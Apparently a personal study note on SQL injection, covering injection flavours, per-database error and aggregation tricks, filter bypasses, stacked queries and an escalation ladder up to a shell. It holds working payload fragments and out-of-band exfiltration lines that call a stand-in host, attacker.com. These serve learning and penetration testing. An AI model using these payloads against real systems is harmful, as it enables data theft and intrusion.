# SQL Injection
Tags: #vulnerability #injection #database #day1 #day4

## Core

SQLi is a parsing confusion problem — user data and SQL code share one string, and the parser can't tell them apart. Wherever input reaches a SQL sink via concatenation instead of parameterized binding, the attacker controls the query structure.

## Mindset

> "SQLi is a parsing confusion problem. Code and data share the same channel."

> "SQLi flavors aren't different bugs — they're the same bug seen through different output channels."

> "A filter is not a wall. It's a list of specific things the developer thought to block."

> "Don't extract one row at a time. Aggregate."

> "SQLi is rarely the prize — it's the front door. The full chain is confirm → data → file read → file write → command exec → shell."

## Flavors = Output Bandwidth

| Flavor | Channel | Bits/req | When |
|---|---|---|---|
| **UNION / in-band** | Rows on page | Many | Page shows query results |
| **Error-based** | DB error in response | Many | App leaks errors |
| **Boolean-blind** | Page differs (200/404, content) | 1 bit | Login forms, exists-checks |
| **Time-based blind** | Response timing | 1 bit | Identical output — only timing leaks |
| **Out-of-band** | DNS/HTTP to your server | Many | DB has outbound network access |

Same concatenation bug. Different controller behavior. The flavor is determined by how loud the page is.

## Error-Based — Per-DB Tricks

Feed a SQL function something that won't parse — the error contains your data.

| Database | Trick | Error contains |
|---|---|---|
| **PostgreSQL** | `CAST((SELECT secret) AS int)` | "invalid input syntax: \<secret\>" |
| **PostgreSQL** | `QUERY_TO_XML(...)::text::int` | Whole table as XML |
| **MySQL ≤5.7** | `EXTRACTVALUE(1, CONCAT(0x7e, (SELECT secret)))` | XPath error with secret |
| **MySQL 8+** | `JSON_KEYS((SELECT CONCAT('{"',secret,'":1}')))` | JSON parse error |
| **MSSQL** | `CONVERT(int, (SELECT secret))` | Conversion error |
| **Oracle** | `UTL_INADDR.GET_HOST_NAME((SELECT secret FROM dual))` | Hostname lookup error |

If errors aren't visible, check for a debug gate: [[Client-Controlled IP Headers]] + [[Debug Mode Disclosure]].

## Side-Channel / Precomputation

> "Don't ask yes/no. If the page has a numeric axis you can index into, encode the secret into that index. One request → one full byte."

Standard blind bisection: ~7 requests/char. Instead, make the page render a row whose ID equals the ASCII value of the secret character. Any output with >2 possible values and a controllable index is a multi-bit channel.

## Aggregation

| Database | Function |
|---|---|
| PostgreSQL | `STRING_AGG(col, ',')` |
| MySQL/SQLite | `GROUP_CONCAT(col SEPARATOR ',')` |
| MSSQL 2017+ | `STRING_AGG(col, ',')` |
| MSSQL older | `FOR XML PATH('')` |
| Oracle | `LISTAGG(col, ',') WITHIN GROUP (ORDER BY col)` |

Whole-table dump: PostgreSQL `QUERY_TO_XML(...)`, MSSQL `FOR JSON AUTO`.

## Out-of-Band (OOB)

> "When the page gives you zero signal, make the database courier the data home. DNS is the channel that always works."

| Database | Primitive | Channel |
|---|---|---|
| MySQL (Windows) | `LOAD_FILE('\\\\<data>.attacker.com\\x')` | DNS via UNC |
| PostgreSQL | `COPY ... TO PROGRAM 'curl ...'` | HTTP (superuser) |
| PostgreSQL | `dblink('host=<data>.attacker.com ...')` | DNS via libpq |
| MSSQL | `xp_dirtree '\\\\<data>.attacker.com\\x'` | DNS+SMB |
| Oracle | `UTL_HTTP.REQUEST(...)` | HTTP |
| Oracle | `UTL_INADDR.GET_HOST_NAME(...)` | DNS only |

Receivers: Burp Collaborator or `interactsh`. When OOB fails (egress firewall, missing privs, DNS caching): fall back to time-based.

## Filter Bypass

> "Each shape has dead zones the parser doesn't care about."

**Shape bypass (email/URL regex):** Email regexes ignore everything before `@`. SQL `--` comments out everything after. Payload fits in both: `' or 1=1--@x.com`.

| Shape | Dead zone | Smuggle |
|---|---|---|
| Email | Before `@` | `' or 1=1--@x.com` |
| URL | Path/query/fragment | `https://x.com/?'or+1=1--` |
| Alphanumeric | Hex literals | `0x61646D696E` = `'admin'` (MySQL) |

**`matches()` vs `find()` (Java):** `matches()` checks the whole string — partial payloads slip through. `find()` checks any substring. Developers confuse these constantly.

**Space bypass:** `/**/` is the universal SQL space replacement.

**Quote bypass per DB:**

| Database | No-quote string |
|---|---|
| PostgreSQL | `$$admin$$` (dollar-quoted) |
| MySQL | `0x61646D696E` (hex) or `CHAR(97,100,109,105,110)` |
| MSSQL | `CHAR(97)+CHAR(100)+...` |
| Oracle | `q'[admin]'` or `CHR(97)\|\|CHR(100)\|\|...` |

**Keyword bypass:** Case mixing, comment-splitting `UN/**/ION`, MySQL version comments `/*!50000UNION*/`.

## Stacked Queries

`;` ends the original query, starts a new one — INSERT/UPDATE/DELETE/RCE.

| Stack | Default? |
|---|---|
| PostgreSQL + psycopg2 | **Yes** |
| MySQL + JDBC | **No** (need `allowMultiQueries=true`) |
| MSSQL + most drivers | **Yes** |
| Oracle | **No** |

## Second-Order

Injection and execution happen in different code paths at different times. Attacker stores `admin'--` during registration; a later query uses it unsafely. The dangerous assumption: "data from our own database is safe." Nearly invisible to scanners.

## Escalation Ladder

```
LEVEL 0  ─ Confirm bug          (' breaks query)
LEVEL 1  ─ Read data            (UNION/error/blind)
LEVEL 2  ─ Read OS files        (COPY FROM / LOAD_FILE)
LEVEL 3  ─ Write OS files       (COPY TO / INTO OUTFILE / large objects)
LEVEL 4  ─ Execute commands     (COPY FROM PROGRAM / xp_cmdshell / C extension)
LEVEL 5  ─ Interactive shell    (reverse shell → privesc)
```

**Gate check:** `SELECT current_user, current_setting('is_superuser');` — if yes, levels 2–5 are 60 seconds of typing.

Full chain: [[SQLi to RCE on PostgreSQL]]. Per-DB primitives: [[Database as a Process]]. Defensive layers: [[Principle of Least Privilege]].

## Chains

- [[Client-Controlled IP Headers]] — spoof header to flip debug gate, upgrade blind → error-based
- [[Debug Mode Disclosure]] — debug catch blocks turn DB errors into your output channel
- [[SQLi to RCE on PostgreSQL]] — full five-level escalation from quote to shell
- [[Database as a Process]] — why every SQLi against a superuser connection becomes RCE
- [[Principle of Least Privilege]] — the only thing that contains the chain at every level

## Key Watchpoints

- The comma-separated tuple is the difference between parameterized and vulnerable in Python: `execute("...%s", (var,))` vs `execute("...%s" % var)`
- `information_schema` is the universal DB map; Oracle uses `ALL_TABLES`/`ALL_TAB_COLUMNS`, SQLite uses `sqlite_master`
- ORDER BY injection leaks data via `CASE` expressions — sort order is a 1-bit channel
- Precomputation widens vertical (full byte/request), aggregation widens horizontal (all rows/request) — combine both
- Default installs run as superuser. The escalation is gated on `is_superuser`, not on the SQLi itself
- Real-world breaches (Sony, Heartland, TalkTalk, MOVEit) use this same five-level chain

## My Notes
